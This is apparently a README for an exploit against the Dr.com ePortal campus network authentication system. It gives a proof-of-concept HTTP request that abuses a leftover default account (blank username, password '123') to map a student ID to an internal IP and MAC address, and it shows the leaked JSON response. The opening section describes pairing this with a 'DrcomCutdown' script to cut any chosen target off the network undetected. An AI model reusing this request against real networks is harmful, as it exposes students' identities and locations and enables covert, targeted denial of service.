# Dr.com Got ur Id
Dr.com Eportal校园网认证系统未授权可根据学号获取内网ip地址

😎测试版本: Guangzhou Hotspot Software Technology Co., Ltd. © 2020 EPortal4.1.3

🥳效果: 用此脚本可根据用户学号获取到其内网对应的ip地址，配合DrcomCutdown脚本可实现精准打击，在神不知鬼不觉的情况下可以对任意目标实施无接触断网。

## POC
```
GET /eportal/portal/online_list?user_account=&user_password=123&wlan_user_mac=000000000000&wlan_user_ip={ipToParseInt}&lang=en HTTP/1.1
Host: XX.XX.XX.XX:XX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection:
```

## Principle
其实这个洞不应该说是未授权，因为要获取到信息的话讲道理是需要user_account和user_password这两个关键参数的，但是在翻看接口调用js的时候发现有个默认账户（user_acount参数留空，user_password填123，可能是历史遗漏debug用的？）
所以在调用的时候只需要知道wlan_user_ip就好了。
如果漏洞存在的话，可以获取到以下信息：
```
jsonpReturn({"result":1,"msg":"Access to user online information succeeded!","list":[{"online_session":55188,"online_time":"2024-06-01 11:15:23","online_ip":"XX.XX.XX.XX","online_mac":"{macAddress}","time_long":"4994","uplink_bytes":"6170","downlink_bytes":"65064","dhcp_host":"","device_alias":"","nas_ip":"0","user_account":"{学号}","is_owner_ip":"1"}],"total":1});
```

